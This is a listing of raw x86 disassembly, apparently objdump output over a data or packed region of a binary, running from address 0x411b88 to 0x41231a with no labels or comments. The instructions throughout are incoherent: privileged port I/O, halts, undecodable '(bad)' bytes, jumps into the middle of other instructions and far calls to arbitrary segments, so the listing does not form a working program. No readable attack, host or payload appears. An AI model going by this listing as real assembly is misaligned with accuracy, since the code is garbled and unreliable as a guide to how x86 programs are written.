  411b88:	in     eax,dx
  411b89:	adc    BYTE PTR [edi+eiz*1+0x427355c7],0x2a
  411b91:	outs   dx,BYTE PTR ds:[esi]
  411b92:	popf   
  411b93:	aad    0x62
  411b95:	shl    dh,cl
  411b97:	cdq    
  411b98:	mov    ecx,0xd470a8d5
  411b9d:	or     DWORD PTR [ebx+0x3f9ea811],ebp
  411ba3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ba4:	push   ds
  411ba5:	sbb    DWORD PTR [ebx+edx*2+0x69],eax
  411ba9:	or     DWORD PTR [ebp-0x1da95bcc],ebx
  411baf:	jp     0x411bad
  411bb1:	shl    BYTE PTR [edi+eax*2-0x7d],1
  411bb5:	add    eax,0x24e13173
  411bba:	push   ebx
  411bbb:	push   ss
  411bbc:	aaa    
  411bbd:	lods   eax,DWORD PTR ds:[esi]
  411bbe:	call   0x2ffc0410
  411bc3:	ds scas al,BYTE PTR es:[edi]
  411bc5:	mov    edi,fs
  411bc7:	mov    ch,0xae
  411bc9:	push   0xffffffdf
  411bcb:	jecxz  0x411c1c
  411bcd:	imul   ebp,eax,0x641f84e7
  411bd3:	inc    eax
  411bd4:	hlt    
  411bd5:	enter  0xf0ea,0xf8
  411bd9:	add    al,BYTE PTR [ecx+0xf]
  411bdc:	loop   0x411bd3
  411bde:	int    0x33
  411be0:	xor    edi,ebp
  411be2:	mov    ebx,0x4184aec6
  411be7:	push   ds
  411be8:	not    bh
  411bea:	cmp    bl,BYTE PTR [ebx+0x7b]
  411bed:	mov    cl,0xaf
  411bef:	adc    DWORD PTR [ebx-0x4dc8b141],0x1c
  411bf6:	cli    
  411bf7:	loope  0x411c5f
  411bf9:	mov    ebx,0x6699beff
  411bfe:	and    DWORD PTR [edx-0x6a212d2b],eax
  411c04:	sub    BYTE PTR [edx-0x2334edbd],dh
  411c0a:	sbb    al,0x51
  411c0c:	push   0xd4e4665a
  411c11:	xchg   esi,eax
  411c12:	sbb    edx,DWORD PTR [edx-0x33f81393]
  411c18:	push   cs
  411c19:	inc    esp
  411c1a:	hlt    
  411c1b:	pop    esp
  411c1c:	cwde   
  411c1d:	sbb    al,0x79
  411c1f:	sub    dl,dh
  411c21:	call   0x14cc607f
  411c26:	out    dx,al
  411c27:	in     eax,dx
  411c28:	(bad)  
  411c29:	(bad)  
  411c2b:	push   ss
  411c2c:	push   0x67d0d8d2
  411c31:	mov    ah,0x5b
  411c33:	hlt    
  411c34:	push   ebp
  411c35:	idiv   DWORD PTR [ebp+0x31be63ba]
  411c3b:	cmp    bh,BYTE PTR [esi]
  411c3d:	fwait
  411c3e:	out    dx,eax
  411c3f:	rcr    BYTE PTR [ecx+0x10],1
  411c42:	pop    esp
  411c43:	test   al,0x57
  411c45:	or     cl,bh
  411c47:	inc    esp
  411c48:	popa   
  411c49:	in     eax,0xf1
  411c4b:	mov    edx,0xec6b3f21
  411c50:	add    BYTE PTR [edx-0x75477154],bh
  411c56:	add    esp,DWORD PTR [ebx+0x44]
  411c59:	push   cs
  411c5a:	hlt    
  411c5b:	mov    bl,BYTE PTR cs:[esi-0x32c26a18]
  411c62:	sub    al,BYTE PTR [edi+0x645e8afd]
  411c68:	into   
  411c69:	inc    ecx
  411c6a:	sub    DWORD PTR [edi-0x5bebe50f],edi
  411c70:	ja     0x411c23
  411c72:	push   esp
  411c73:	shl    DWORD PTR [edx+0x7c],cl
  411c76:	sbb    eax,0x1310443d
  411c7b:	push   ebx
  411c7c:	pop    ebp
  411c7d:	jl     0x411c4e
  411c7f:	jp     0x411c3d
  411c81:	adc    al,0x62
  411c83:	outs   dx,BYTE PTR ds:[esi]
  411c84:	inc    esp
  411c85:	dec    edi
  411c87:	add    al,0xb1
  411c89:	push   esi
  411c8a:	(bad)  
  411c8b:	stos   DWORD PTR es:[edi],eax
  411c8c:	adc    bl,dh
  411c8e:	aaa    
  411c8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c90:	jb     0x411c99
  411c92:	fdiv   st(2),st
  411c94:	xor    BYTE PTR [edi],dl
  411c96:	fwait
  411c97:	imul   ecx,eax,0xffffffb6
  411c9a:	mov    bl,0x81
  411c9c:	adc    eax,0x363449a6
  411ca1:	xlat   BYTE PTR ds:[ebx]
  411ca2:	add    bl,BYTE PTR [ecx]
  411ca4:	aaa    
  411ca5:	es pop ebp
  411ca7:	cmp    DWORD PTR [edx+0x41],esp
  411caa:	sbb    BYTE PTR [edi-0xd],0x57
  411cae:	pop    ds
  411caf:	cmp    BYTE PTR [edi],bh
  411cb1:	mov    edi,DWORD PTR [eax+0x3a]
  411cb4:	lods   eax,DWORD PTR ds:[esi]
  411cb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cb6:	jmp    0x7a65:0x203ff42f
  411cbd:	out    dx,al
  411cbe:	dec    eax
  411cbf:	popf   
  411cc0:	add    esp,DWORD PTR [edx+0x793d15d0]
  411cc6:	shl    BYTE PTR [ebp-0x5],0x4f
  411cca:	sbb    BYTE PTR [ebx-0x74b2e809],dh
  411cd0:	div    ecx
  411cd2:	mov    ecx,0x2298640a
  411cd7:	mov    ds:0x9443ebb9,al
  411cdc:	xchg   edx,eax
  411cdd:	ins    BYTE PTR es:[edi],dx
  411cde:	in     eax,0xab
  411ce0:	cld    
  411ce1:	lds    ebx,FWORD PTR [eax+0x4804740d]
  411ce7:	nop
  411ce8:	repnz cwde 
  411cea:	push   ebp
  411ceb:	and    al,0x99
  411ced:	sub    BYTE PTR [edx-0x3800f02b],cl
  411cf3:	iret   
  411cf4:	mov    eax,ds:0x7b3103fd
  411cf9:	scas   eax,DWORD PTR es:[edi]
  411cfa:	outs   dx,DWORD PTR ds:[esi]
  411cfb:	add    BYTE PTR [edi-0x69],bh
  411cfe:	in     eax,dx
  411cff:	add    eax,0x8267e832
  411d04:	or     al,0xf1
  411d06:	pop    ebx
  411d07:	repnz sbb ah,BYTE PTR [ebx-0x3c]
  411d0b:	aam    0x72
  411d0d:	mov    esp,0x7fb5385e
  411d12:	int    0xc4
  411d14:	push   eax
  411d15:	outs   dx,BYTE PTR ds:[esi]
  411d16:	dec    eax
  411d17:	dec    edi
  411d18:	(bad)  
  411d19:	mov    eax,0xaa2e62ee
  411d1e:	push   ds
  411d1f:	nop
  411d20:	or     BYTE PTR [eax+0x3a30118f],ah
  411d26:	fimul  DWORD PTR [eax+eax*1+0x15]
  411d2a:	push   0xffffff8c
  411d2c:	sahf   
  411d2d:	les    edi,FWORD PTR [ebp-0x79]
  411d30:	and    BYTE PTR [ebx],bl
  411d32:	inc    ebp
  411d33:	xchg   ebx,eax
  411d34:	jnp    0x411d67
  411d36:	or     DWORD PTR [ebp-0x3a],0xffffffaa
  411d3a:	scas   eax,DWORD PTR es:[edi]
  411d3b:	inc    ecx
  411d3c:	pop    ebp
  411d3d:	xor    al,0x7c
  411d3f:	push   edx
  411d40:	cdq    
  411d41:	cmc    
  411d42:	pop    esp
  411d43:	inc    ecx
  411d44:	js     0x411d46
  411d46:	xchg   esi,eax
  411d47:	bound  edi,QWORD PTR [edx+0x7c1ecbbc]
  411d4d:	out    dx,al
  411d4e:	inc    eax
  411d4f:	jo     0x411ce8
  411d51:	out    dx,eax
  411d52:	push   edx
  411d53:	outs   dx,DWORD PTR ds:[esi]
  411d54:	test   eax,0xe32af85f
  411d59:	mov    al,0xa0
  411d5b:	call   0xd4cb8766
  411d60:	inc    DWORD PTR [ebx]
  411d62:	sar    edi,1
  411d64:	fnstenv [edi+edx*1]
  411d67:	imul   eax,DWORD PTR [ebx],0x42
  411d6a:	push   ss
  411d6b:	push   esp
  411d6c:	inc    edi
  411d6d:	call   0xd314:0x857fa826
  411d74:	pop    esp
  411d75:	xchg   esp,eax
  411d76:	pop    ss
  411d77:	pop    ebp
  411d78:	add    BYTE PTR [ebx+edi*8],0x3c
  411d7c:	and    ecx,DWORD PTR [ebx+0x4d]
  411d7f:	out    0x7b,eax
  411d81:	push   ebp
  411d82:	mov    al,ds:0x6d5b966f
  411d87:	cmp    edx,0xd7629c2d
  411d8d:	div    BYTE PTR ds:0xa52f93be
  411d93:	jp     0x411da3
  411d95:	mul    ebx
  411d97:	mov    bh,0x24
  411d99:	push   ebp
  411d9a:	(bad)  
  411d9b:	fst    DWORD PTR ds:0xdb8bb0e1
  411da1:	inc    ebx
  411da2:	pop    edx
  411da3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411da4:	pusha  
  411da5:	out    dx,eax
  411da6:	fucomi st,st(1)
  411da8:	lods   al,BYTE PTR ds:[esi]
  411da9:	pop    edx
  411daa:	sbb    ebp,DWORD PTR [eax]
  411dac:	fisttp QWORD PTR [eax]
  411dae:	add    dl,dl
  411db0:	xchg   edx,eax
  411db1:	jo     0x411d3a
  411db3:	lods   eax,DWORD PTR ds:[esi]
  411db4:	shr    DWORD PTR [edx+0x78ccb016],0x22
  411dbb:	pop    eax
  411dbc:	pusha  
  411dbd:	test   al,0xab
  411dbf:	xchg   ecx,eax
  411dc0:	push   ds
  411dc1:	xor    BYTE PTR ss:[ebp+0x1b],dh
  411dc5:	push   ss
  411dc6:	jne    0x411e25
  411dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dc9:	stc    
  411dca:	or     al,BYTE PTR [esi]
  411dcc:	(bad)
  411dd0:	daa    
  411dd1:	mov    ah,0xc
  411dd3:	xchg   edx,eax
  411dd4:	and    al,0xaf
  411dd6:	add    DWORD PTR [ecx],ebx
  411dd8:	xchg   edx,eax
  411dd9:	imul   ecx,DWORD PTR [esi+0x34],0x4e
  411ddd:	inc    ebx
  411dde:	aas    
  411ddf:	enter  0x5b2f,0xaa
  411de3:	xor    al,cl
  411de5:	daa    
  411de6:	sar    BYTE PTR [ecx+0x4e],cl
  411de9:	or     dh,BYTE PTR [edi+eiz*8+0x467db547]
  411df0:	sbb    DWORD PTR [esi],ebx
  411df2:	xchg   BYTE PTR [ebx+0x6ee0a55e],bh
  411df8:	mov    eax,0x1d3c6142
  411dfd:	lea    ebp,[ebx-0x7551f3b3]
  411e03:	pop    ds
  411e04:	and    ch,BYTE PTR [esi+0x6db926d3]
  411e0a:	mov    DWORD PTR [ebp-0x304d445],ebx
  411e10:	mov    al,ds:0x7d4402a2
  411e15:	xchg   esp,eax
  411e16:	xor    BYTE PTR [edi+ecx*8+0x15bc52a1],0x46
  411e1e:	mov    al,ds:0x89774d29
  411e23:	mov    dh,bh
  411e25:	mov    cl,0x28
  411e27:	loope  0x411e66
  411e29:	aas    
  411e2a:	add    eax,0xee7306c2
  411e2f:	push   eax
  411e30:	in     al,dx
  411e31:	call   0xa29ab651
  411e36:	dec    esi
  411e37:	fisttp DWORD PTR [edx+0x7285262]
  411e3d:	cdq    
  411e3e:	mov    eax,0x2a3d50c
  411e43:	mov    edi,0x9d0e0093
  411e48:	push   esp
  411e49:	ds das 
  411e4b:	jae    0x411e7e
  411e4d:	je     0x411e35
  411e4f:	out    0x3d,eax
  411e51:	sbb    edi,edx
  411e53:	cwde   
  411e54:	cdq    
  411e55:	scas   al,BYTE PTR es:[edi]
  411e56:	dec    edi
  411e57:	jmp    0x411e55
  411e59:	push   ds
  411e5a:	out    dx,al
  411e5b:	mov    ds:0x328d1434,al
  411e60:	mov    esi,0x6b6a0ca4
  411e65:	pop    edi
  411e66:	add    eax,0xc26f68e0
  411e6b:	xchg   esp,eax
  411e6c:	and    BYTE PTR [eax+0x1986c208],cl
  411e72:	inc    ecx
  411e73:	outs   dx,BYTE PTR ds:[esi]
  411e74:	pushf  
  411e75:	inc    edx
  411e76:	push   edx
  411e77:	ror    cl,cl
  411e79:	inc    edx
  411e7a:	inc    edi
  411e7b:	div    BYTE PTR [ecx]
  411e7d:	ret    0xf22b
  411e80:	test   BYTE PTR fs:0x73d3055c,0xae
  411e88:	xlat   BYTE PTR ds:[ebx]
  411e89:	jl     0x411eb1
  411e8b:	push   edi
  411e8c:	dec    eax
  411e8d:	mov    al,0x4d
  411e8f:	int    0x81
  411e91:	mov    bl,0x89
  411e93:	mov    dl,0xbd
  411e95:	imul   esi,DWORD PTR [edi-0x46],0xffffff87
  411e99:	mov    dh,0x4
  411e9b:	ins    BYTE PTR es:[edi],dx
  411e9c:	or     DWORD PTR [edi+0x2b79c9c5],0xfd57b15a
  411ea6:	in     al,0xbc
  411ea8:	fisubr WORD PTR [edi]
  411eaa:	retf   0xa6aa
  411ead:	(bad)  [edi-0x202a4f65]
  411eb3:	cmp    eax,0x7aef9e06
  411eb8:	fiadd  DWORD PTR [edx]
  411eba:	neg    ah
  411ebc:	stc    
  411ebd:	and    eax,0x80ee4127
  411ec2:	jecxz  0x411e4f
  411ec4:	or     DWORD PTR [ebx],ebx
  411ec6:	scas   eax,DWORD PTR es:[edi]
  411ec7:	dec    ebp
  411ec8:	aam    0xfc
  411eca:	jb     0x411e5f
  411ecc:	cmp    ch,ch
  411ece:	(bad)  
  411ecf:	fsub   QWORD PTR [ebp-0x5e]
  411ed2:	dec    ecx
  411ed3:	sub    ecx,DWORD PTR [ecx+0x25]
  411ed6:	jne    0x411f3c
  411ed8:	xor    BYTE PTR [edx+ebx*2+0x2b],bl
  411edc:	adc    ecx,DWORD PTR [esi]
  411ede:	ss (bad) 
  411ee0:	pop    esp
  411ee1:	(bad)  
  411ee2:	xchg   ecx,eax
  411ee3:	cmp    esi,DWORD PTR [esi]
  411ee5:	jbe    0x411efb
  411ee7:	jno    0x411eaf
  411ee9:	inc    ebp
  411eea:	ret    0x2976
  411eed:	xchg   BYTE PTR [ebx+0x11],ah
  411ef0:	mov    eax,ds:0x3da82e54
  411ef5:	adc    eax,0x2a4e8695
  411efa:	fbld   TBYTE PTR [ecx]
  411efc:	in     eax,0x92
  411efe:	pop    ebp
  411eff:	lock cmp BYTE PTR [ebx+ecx*1],bl
  411f03:	mov    ah,0xee
  411f05:	mov    bl,0x51
  411f07:	adc    ebx,esi
  411f09:	dec    eax
  411f0a:	mov    DWORD PTR [ebx+eiz*1+0x742347ef],ebp
  411f11:	shl    DWORD PTR [esi+eiz*4-0x75ddcf9a],1
  411f18:	sub    DWORD PTR [edi-0x6156bbc7],ecx
  411f1e:	lods   eax,DWORD PTR ds:[esi]
  411f20:	jp     0x411f3d
  411f22:	outs   dx,BYTE PTR ds:[esi]
  411f23:	(bad)  
  411f24:	pusha  
  411f25:	es jne 0x411eb5
  411f28:	or     ebp,DWORD PTR [edi-0x58]
  411f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f2c:	lds    edx,FWORD PTR ds:0xeb22cef1
  411f32:	add    BYTE PTR [ecx],dl
  411f34:	cmp    BYTE PTR [eax],0xce
  411f37:	call   0x7c7feb73
  411f3c:	(bad)  
  411f3d:	sbb    edi,ebx
  411f3f:	push   esp
  411f40:	in     eax,dx
  411f41:	inc    ecx
  411f42:	xchg   esp,eax
  411f43:	push   edi
  411f44:	and    edi,DWORD PTR [esi]
  411f46:	and    eax,0xf958e27f
  411f4b:	xchg   ecx,eax
  411f4c:	pop    es
  411f4d:	xlat   BYTE PTR ds:[ebx]
  411f4e:	push   esi
  411f4f:	cli    
  411f50:	aam    0xed
  411f52:	mov    edi,0x3e29b7b3
  411f57:	adc    DWORD PTR [ebx],edi
  411f59:	(bad)  
  411f5a:	jecxz  0x411fc9
  411f5c:	loop   0x411fb4
  411f5e:	ret    0x65b0
  411f61:	fdivrp st(7),st
  411f63:	outs   dx,BYTE PTR ds:[esi]
  411f64:	cmc    
  411f65:	jg     0x411fd1
  411f67:	fiadd  DWORD PTR [ebp-0x6b2207c1]
  411f6d:	mov    dl,0x9c
  411f6f:	sbb    al,0x23
  411f71:	push   ds
  411f72:	cmp    dh,bh
  411f74:	into   
  411f75:	xor    bh,ch
  411f77:	std    
  411f78:	in     eax,dx
  411f79:	(bad)  
  411f7a:	sub    al,0x7a
  411f7c:	or     eax,0x3382d2dc
  411f81:	das    
  411f82:	pusha  
  411f83:	pop    ecx
  411f84:	mov    ds:0xb5cc0d47,al
  411f89:	clc    
  411f8a:	stos   BYTE PTR es:[edi],al
  411f8b:	and    DWORD PTR [edi],esp
  411f8d:	push   esp
  411f8e:	sub    bh,dh
  411f90:	cs xchg ecx,eax
  411f92:	call   0x5c2d:0x7d63189c
  411f99:	repnz adc BYTE PTR [edi],bh
  411f9c:	ins    DWORD PTR es:[edi],dx
  411f9d:	dec    esp
  411f9e:	ds retf 0x9106
  411fa2:	sbb    ebp,ebp
  411fa4:	shl    DWORD PTR [ebp+0x73],cl
  411fa7:	fcomi  st,st(2)
  411fa9:	fdivr  DWORD PTR [ecx]
  411fab:	sub    BYTE PTR [eax+0x3a],al
  411fae:	push   0xfffffff8
  411fb0:	dec    esp
  411fb1:	pusha  
  411fb2:	adc    eax,0xb5333bc7
  411fb7:	out    0x5a,eax
  411fb9:	call   FWORD PTR [eax]
  411fbb:	cmc    
  411fbc:	jmp    0x411fd2
  411fbe:	pop    ss
  411fbf:	mov    ds:0x4632f421,eax
  411fc4:	push   esi
  411fc5:	leave  
  411fc6:	mov    esp,0xf2fab57d
  411fcb:	pop    es
  411fcc:	jb     0x411fd0
  411fce:	out    dx,eax
  411fcf:	sub    DWORD PTR [edx-0x37],eax
  411fd2:	jecxz  0x411f77
  411fd4:	repz fs push cs
  411fd7:	sbb    BYTE PTR [edi],al
  411fd9:	xor    DWORD PTR [ecx+0xd60359d],0x7f
  411fe0:	dec    edx
  411fe1:	mov    BYTE PTR ds:0x1e560878,ch
  411fe7:	ins    DWORD PTR es:[edi],dx
  411fe8:	scas   al,BYTE PTR es:[edi]
  411fe9:	stc    
  411fea:	pop    esi
  411feb:	sar    BYTE PTR [edx+0x38c3b1ff],0x20
  411ff2:	add    BYTE PTR ds:0xd74b160c,bh
  411ff8:	test   ebx,esp
  411ffa:	push   ss
  411ffb:	xor    ah,dl
  411ffd:	add    al,0x13
  411fff:	aam    0x28
  412001:	aaa    
  412002:	pop    ecx
  412003:	sub    eax,0xe49a7586
  412008:	(bad)  
  412009:	leave  
  41200a:	mov    cl,0xf
  41200c:	fcmovne st,st(4)
  41200e:	out    dx,eax
  41200f:	jno    0x411f9d
  412011:	cld    
  412012:	jno    0x411fbe
  412014:	push   esi
  412015:	pop    edx
  412016:	arpl   WORD PTR [ebp-0x1e],ax
  412019:	jmp    DWORD PTR [edi]
  41201b:	sbb    eax,0x59dca250
  412020:	stos   DWORD PTR es:[edi],eax
  412021:	pop    ebx
  412022:	popf   
  412023:	xchg   ecx,eax
  412024:	mov    DWORD PTR [eax],ebp
  412026:	fistp  QWORD PTR [ecx-0x2f]
  412029:	or     DWORD PTR [edx],esi
  41202b:	dec    eax
  41202c:	xchg   ebx,eax
  41202d:	add    DWORD PTR [edi+0x24354228],edx
  412033:	leave  
  412034:	push   ss
  412035:	sub    dl,BYTE PTR [ebx]
  412037:	fwait
  412038:	dec    eax
  412039:	test   al,0x46
  41203b:	call   0x8a897a5
  412040:	jns    0x412079
  412042:	cmp    BYTE PTR [edi],ch
  412044:	lock ds pushf 
  412047:	mov    bh,0x1f
  412049:	adc    ebx,ebp
  41204b:	dec    eax
  41204c:	sbb    bh,ch
  41204e:	(bad)  
  41204f:	lahf   
  412050:	fwait
  412051:	cli    
  412052:	ss cmp al,0x23
  412055:	loop   0x412059
  412057:	mov    ebx,0x308621f9
  41205c:	nop
  41205d:	mov    cl,0xc3
  41205f:	(bad)  [esi]
  412061:	or     BYTE PTR [ebx],0x57
  412064:	and    BYTE PTR [ebp+0x5b1d5bf7],al
  41206a:	or     eax,0x59ade376
  41206f:	or     BYTE PTR [edx-0x126cbfb8],ah
  412075:	mov    ah,0x57
  412077:	push   esp
  412078:	popa   
  412079:	xor    cl,al
  41207b:	xlat   BYTE PTR ds:[ebx]
  41207c:	retf   0xe8
  41207f:	jbe    0x412032
  412081:	mov    ch,0x46
  412083:	(bad)  
  412085:	cmp    BYTE PTR [edx+edx*8-0x70],dh
  412089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41208a:	sbb    BYTE PTR [ebx],dh
  41208c:	dec    esi
  41208d:	test   DWORD PTR [edi+0x9c299f1],eax
  412093:	and    DWORD PTR [ebx-0x7c],ebp
  412096:	stos   BYTE PTR es:[edi],al
  412097:	fwait
  412098:	mov    cl,0xf8
  41209a:	jmp    0x8b328b94
  41209f:	(bad)  
  4120a0:	pop    edi
  4120a1:	(bad)  
  4120a2:	dec    BYTE PTR [edx+0x34]
  4120a5:	pushf  
  4120a6:	popf   
  4120a7:	xchg   BYTE PTR [ecx],bl
  4120a9:	sub    eax,0x609f0652
  4120ae:	sub    BYTE PTR [ebx-0x45],bh
  4120b1:	lods   eax,DWORD PTR ds:[esi]
  4120b2:	pop    esp
  4120b3:	jb     0x412073
  4120b5:	test   al,0x6f
  4120b7:	adc    eax,0xd946221c
  4120bc:	jae    0x41213a
  4120be:	inc    ecx
  4120bf:	sub    bl,ah
  4120c1:	cmc    
  4120c2:	adc    DWORD PTR [esp+edi*8],ebp
  4120c5:	loope  0x4120ae
  4120c7:	push   DWORD PTR [eax]
  4120c9:	repz sub DWORD PTR [ebp+0x1db3825f],eax
  4120d0:	push   0xffffffd5
  4120d2:	outs   dx,BYTE PTR ds:[esi]
  4120d3:	push   0xa8a93db8
  4120d8:	and    BYTE PTR [esi],al
  4120da:	aad    0x34
  4120dc:	stos   DWORD PTR es:[edi],eax
  4120dd:	inc    ebp
  4120de:	sub    eax,0x52354e57
  4120e3:	shl    BYTE PTR [ecx+0x43],cl
  4120e6:	js     0x4120ba
  4120e8:	push   0xffffffed
  4120ea:	push   esi
  4120eb:	ret    
  4120ec:	adc    ebx,esi
  4120ee:	push   0xab8e473f
  4120f3:	xor    DWORD PTR [eax+0x4d],edx
  4120f6:	test   eax,0x6011874b
  4120fb:	inc    ebp
  4120fc:	dec    esi
  4120fe:	mov    ds:0x306897dd,al
  412103:	mov    edx,0xf2440579
  412108:	ret    
  412109:	call   0x40fb:0x38873fd9
  412110:	and    bl,BYTE PTR [esi+0x39e1fc4f]
  412116:	stos   BYTE PTR es:[edi],al
  412117:	jno    0x412114
  412119:	dec    esp
  41211a:	loope  0x4120d2
  41211c:	mov    edi,0x8d698fb2
  412121:	ins    DWORD PTR es:[edi],dx
  412122:	daa    
  412123:	and    dh,dl
  412125:	jp     0x4120b8
  412127:	xchg   esp,eax
  412128:	ins    DWORD PTR es:[edi],dx
  412129:	das    
  41212a:	mov    ecx,0xd70ecf7e
  41212f:	les    ecx,FWORD PTR [ecx]
  412131:	or     eax,0x604ce7ca
  412137:	adc    eax,0x9478b865
  41213c:	cmp    dh,BYTE PTR [esi+0x12935e13]
  412142:	mov    ecx,0x6e9ce473
  412147:	in     eax,dx
  412148:	xchg   ebp,eax
  412149:	pop    edi
  41214a:	lods   eax,DWORD PTR ds:[esi]
  41214b:	fdiv   QWORD PTR [edx-0xb]
  41214e:	fidivr WORD PTR [edx-0x3a7db7c6]
  412154:	cdq    
  412155:	fsub   QWORD PTR [ecx-0x27]
  412158:	mov    esi,0x1ea78260
  41215d:	inc    ecx
  41215e:	push   0xb4cac3cc
  412163:	test   BYTE PTR [ebp-0x1ad5c1bb],ch
  412169:	and    BYTE PTR [ecx-0x667c8ccb],0xe9
  412170:	cmp    al,0x93
  412172:	loop   0x4121e9
  412174:	sahf   
  412175:	mov    al,ds:0x13e7e24a
  41217a:	dec    edx
  41217b:	mov    eax,ds:0x5cf7cec
  412180:	pop    eax
  412181:	jae    0x4121fa
  412183:	std    
  412184:	pusha  
  412185:	out    0xc6,al
  412187:	aad    0xe8
  412189:	outs   dx,DWORD PTR ds:[esi]
  41218a:	outs   dx,BYTE PTR ds:[esi]
  41218b:	or     ebx,DWORD PTR [ecx+0x29]
  41218e:	(bad)  
  41218f:	adc    BYTE PTR [esi-0x6f],dh
  412192:	aam    0xa6
  412194:	pusha  
  412195:	inc    esi
  412196:	jmp    0x460d:0x9163d7a6
  41219d:	add    eax,0x4f224708
  4121a2:	sbb    bh,0x88
  4121a5:	xor    DWORD PTR [eax+0x5ff6df74],edx
  4121ab:	sbb    eax,0x1b35c49c
  4121b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121b1:	sbb    DWORD PTR [ecx],edi
  4121b3:	nop
  4121b4:	(bad)  
  4121b5:	jmp    0x412139
  4121b7:	(bad)  
  4121b9:	jg     0x41219d
  4121bb:	test   eax,0x323d247b
  4121c0:	xchg   ah,bl
  4121c2:	(bad)  
  4121c4:	scas   al,BYTE PTR es:[edi]
  4121c5:	or     edi,ebp
  4121c7:	xlat   BYTE PTR ds:[ebx]
  4121c8:	sti    
  4121c9:	popf   
  4121ca:	bound  esp,QWORD PTR [eax+ebp*8]
  4121cd:	daa    
  4121ce:	int3   
  4121cf:	xchg   ebp,eax
  4121d0:	push   eax
  4121d1:	test   eax,0x11619c45
  4121d6:	jecxz  0x41217d
  4121d8:	pusha  
  4121d9:	aaa    
  4121da:	fwait
  4121db:	dec    ecx
  4121dc:	loope  0x4121cb
  4121de:	push   es
  4121df:	cmp    BYTE PTR [ebx+0x60868a57],bh
  4121e5:	push   ebp
  4121e6:	sub    al,0x27
  4121e8:	mov    dh,0x70
  4121ea:	int3   
  4121eb:	xchg   ecx,eax
  4121ec:	adc    al,0x22
  4121ee:	sub    BYTE PTR [edx],ch
  4121f0:	jg     0x4121e0
  4121f2:	dec    ecx
  4121f3:	or     bl,BYTE PTR [edx+ebp*1]
  4121f6:	bound  esp,QWORD PTR [ecx+0x363182ac]
  4121fc:	and    BYTE PTR [esi-0x2f3195be],ch
  412202:	test   eax,0x4ad7db6
  412207:	mov    eax,0x63bc6d31
  41220c:	push   ecx
  41220d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41220e:	(bad)  
  41220f:	and    eax,0x78dc6d56
  412214:	icebp  
  412215:	leave  
  412216:	jmp    0xf1b8:0x2368efb6
  41221d:	(bad)  
  41221f:	mov    al,0x83
  412221:	xor    bl,BYTE PTR [edx-0x10]
  412224:	les    edx,FWORD PTR [ecx-0x17937bc]
  41222a:	pop    edi
  41222b:	call   0x80767023
  412230:	stc    
  412231:	pushf  
  412232:	shr    BYTE PTR [eax],0x6
  412235:	cmp    ebx,eax
  412237:	repz test BYTE PTR [esi],cl
  41223a:	and    bl,BYTE PTR [ebx+0x35]
  41223d:	or     ah,ch
  41223f:	mov    edx,0xd17e4d1b
  412244:	sbb    al,0x4
  412246:	in     al,0x70
  412248:	pop    ecx
  412249:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41224a:	dec    esp
  41224b:	icebp  
  41224c:	fistp  DWORD PTR [eax]
  41224e:	nop
  41224f:	mov    gs,WORD PTR [ecx-0x734d8fa1]
  412255:	aad    0xb4
  412257:	sbb    dh,BYTE PTR [edx+0x2c]
  41225a:	fldenv [ebx-0x5f43f81b]
  412260:	xor    dh,BYTE PTR [edx]
  412262:	xchg   esi,eax
  412263:	xchg   ebx,eax
  412264:	pusha  
  412265:	stos   DWORD PTR es:[edi],eax
  412266:	bound  ebp,QWORD PTR [edx]
  412268:	push   edi
  412269:	xlat   BYTE PTR ds:[ebx]
  41226a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41226b:	xchg   edi,eax
  41226c:	jno    0x412259
  41226e:	(bad)  
  412270:	xchg   BYTE PTR [esi-0x569e42c1],bh
  412276:	or     ah,BYTE PTR [edx-0x6222b9c9]
  41227c:	sub    ebp,esi
  41227e:	inc    ebx
  41227f:	aam    0x9c
  412281:	ret    0x8d6b
  412284:	dec    ebp
  412285:	mov    esp,0x6342de15
  41228a:	test   DWORD PTR [ecx-0x1f],0x5e05a720
  412291:	push   0x64919127
  412296:	jp     0x412296
  412298:	xchg   esi,eax
  412299:	jo     0x412236
  41229b:	jecxz  0x412302
  41229d:	lods   ax,WORD PTR ds:[esi]
  41229f:	lods   eax,DWORD PTR ds:[esi]
  4122a0:	out    dx,eax
  4122a1:	addr16 test eax,0xb6184d13
  4122a7:	sbb    DWORD PTR ds:0x2870857c,esp
  4122ad:	fstp   QWORD PTR [esi]
  4122af:	rol    BYTE PTR [eax+0xd509177],cl
  4122b5:	cmp    al,0x4f
  4122b7:	mov    esi,0x75c51636
  4122bc:	mov    esp,0x9b49c6a4
  4122c1:	and    BYTE PTR [ebx+edi*2+0x2896fb9f],dh
  4122c8:	clc    
  4122c9:	mov    ebp,0x21549764
  4122ce:	les    edi,FWORD PTR [esi+esi*2+0x45]
  4122d2:	js     0x41232f
  4122d4:	out    dx,al
  4122d5:	xor    ch,BYTE PTR [esi+0x44b92b82]
  4122db:	outs   dx,DWORD PTR ds:[esi]
  4122dc:	xchg   esi,eax
  4122dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122de:	fidivr WORD PTR [ebx+eax*2]
  4122e1:	lock sbb BYTE PTR [ecx+ebp*4+0x559cda34],al
  4122e9:	inc    DWORD PTR [edi+0x49]
  4122ec:	aad    0xe6
  4122ee:	push   es
  4122ef:	sub    DWORD PTR [edx+edi*2-0x985fa67],esp
  4122f6:	pop    ds
  4122f7:	stos   DWORD PTR es:[edi],eax
  4122f8:	adc    BYTE PTR [ebx+ebp*8-0x2bb8e5bc],cl
  4122ff:	les    edx,FWORD PTR [eax-0x1d7437c9]
  412305:	lds    edi,FWORD PTR [edi+0x1fd96dd0]
  41230b:	xchg   ebp,eax
  41230c:	adc    ebp,eax
  41230e:	and    BYTE PTR [edx-0x37],al
  412311:	sbb    eax,0xc0255c1f
  412316:	outs   dx,BYTE PTR ds:[esi]
  412317:	cwde   
  412318:	out    dx,al
  412319:	outs   dx,DWORD PTR ds:[esi]
  41231a:	gs cmp eax,0x31fead2a
